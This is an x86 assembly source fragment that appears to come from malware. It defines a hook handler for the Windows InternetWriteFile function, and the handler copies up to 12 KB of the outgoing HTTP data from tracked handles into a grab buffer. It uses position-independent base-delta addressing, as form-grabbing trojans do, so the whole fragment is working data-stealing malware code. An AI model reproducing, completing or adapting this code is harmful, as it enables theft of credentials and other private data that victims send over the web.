
.code

;; ==================================================================================================== ;;
;; hInternetWriteFile is a InternetWriteFile handler procedure                                          ;;
;; Search current handle in array of send handles                                                       ;;
;; If handle found then grab currently send data                                                        ;;
;; ==================================================================================================== ;;
hInternetWriteFile proc uses ecx ebx esi edi p1, p2, p3, p4 : dword
	local  MyEAX : dword



	GetBaseDelta ebx

	invokx  _InternetWriteFile[ebx], p1, p2, p3, p4
	jmpnz eax, @F
	ret


@@:	mov  MyEAX, eax


	invokx  &IsGrabTerm[ebx], p1
	jmpz eax, @ret


	invokx  &ArrayKeyPos[ebx], lpSendBuffersArray[ebx], p1
	jmpz eax, @ret			;; handle not found

	mov  esi, [eax+4]		;; pointer to buff with previous grabbed data & its len in 1-st dword

	mov  eax, [esi]			;; len of previous grabbed data
	lea  edi, [esi+eax+4]	;; pointer to end of previous grabbed data



	;; check for data buff len limit
	mov  ecx, 12*KBYTE
	sub  ecx, eax	;; space left in buffer
	jmpz ecx, @ret	;; no more space
	mov  eax, p4
	cmp  ecx, [eax]
	jbe  @F
	mov  ecx, [eax]	;; ecx - len of data for grab


	;; grab
@@:	add  [esi], ecx		;; new len
	invokx &strcpyn[ebx], edi, p2, ecx


@ret:
	mov  eax, MyEAX
	ret
hInternetWriteFile endp

